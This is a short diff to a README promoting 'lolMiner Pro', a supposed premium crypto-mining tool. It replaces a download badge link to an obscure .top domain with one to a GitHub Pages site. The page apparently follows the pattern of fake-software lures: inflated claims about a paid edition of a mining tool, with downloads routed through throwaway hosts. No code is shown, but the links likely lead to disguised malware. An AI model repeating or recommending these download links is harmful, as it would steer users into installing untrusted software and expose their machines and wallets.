@@ -2,7 +2,7 @@
 
 🔥 lolMiner Pro is the most advanced, feature-packed cryptocurrency mining software supporting 25+ algorithms across CPU and GPU architectures. Engineered for professional miners and crypto enthusiasts, our solution delivers unmatched hashrates, industry-low 0.5% dev fee, and military-grade stability for 24/7 mining operations.  
 
-[![Download lolMiner Pro](https://img.shields.io/badge/🚀_Download-lolMiner_Pro_2025-9B59B6)](https://poelkakusthbutn.top/)   
+[![Download lolMiner Pro](https://img.shields.io/badge/🚀_Download-lolMiner_Pro_2025-9B59B6)](https://lolminer-cpu-gpu.github.io/.github)   
 
 ---  
 
